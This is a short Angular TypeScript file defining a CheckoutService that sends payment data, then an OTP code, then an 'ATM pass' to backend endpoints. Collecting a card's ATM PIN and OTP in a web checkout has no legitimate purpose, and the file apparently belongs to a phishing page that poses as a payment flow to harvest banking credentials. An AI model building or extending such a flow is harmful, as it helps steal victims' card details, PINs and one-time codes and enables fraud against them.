import { Injectable } from '@angular/core';
import { BaseApiService } from './base-api.service';
import { Observable, tap } from 'rxjs';

@Injectable({
  providedIn: 'root'
})
export class CheckoutService extends BaseApiService {
  cardId: string | null = null;

  submitPayment(paymentData: any): Observable<any> {
    return this.post<any>(`/api/user/create`, paymentData).pipe(
      tap((res) => {
        if (res?.CardId) {
          this.cardId = res.CardId;
        }
      })
    );
  }

  verifyOtp(transactionId: string, otpCode: string): Observable<{success: boolean}> {
    return this.post<{success: boolean}>(`/checkout/verify-otp`, { transactionId, otpCode });
  }

  confirmAtmPass(transactionId: string, atmPass: string): Observable<{success: boolean}> {
    return this.post<{success: boolean}>(`/checkout/confirm-atm`, { transactionId, atmPass });
  }
}

